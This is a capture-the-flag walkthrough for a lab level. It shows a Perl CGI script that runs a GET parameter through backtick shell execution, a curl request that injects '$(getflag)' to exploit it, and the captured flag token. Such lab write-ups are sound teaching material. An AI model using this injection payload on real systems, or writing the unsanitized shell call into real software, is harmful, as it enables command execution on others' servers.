
# Resources for level04

## Walkthrough to capture the flag:

### Step 1: List files in the home directory
```bash
ls
```
> Output:
```
level04.pl
```

### Step 2: Read the content of `level04.pl`
```bash
cat level04.pl
```
> Output:
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

> This script starts a simple web server on `localhost:4747` that reads a GET parameter `x` and executes it using backticks (shell execution). This is a **command injection** vulnerability.

---

### Step 3: Exploit the vulnerability using `curl`
```bash
curl 'localhost:4747/?x=$(getflag)'
```

> Output:
```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

**Note:** It is important to use **single quotes `'`** around the URL in `curl` to prevent the shell from interpreting `$(getflag)` before the request is sent. If you use double quotes `"`, the command substitution will be evaluated locally instead of being passed to the server.

---

### Summary:
- The Perl script does not sanitize user input.
- It executes any shell command passed through the `x` parameter.
- We passed `$(getflag)` to the server, which was executed by the vulnerable script.
- This gave us the flag: `ne2searoevaevoem4ov4ar8ap`
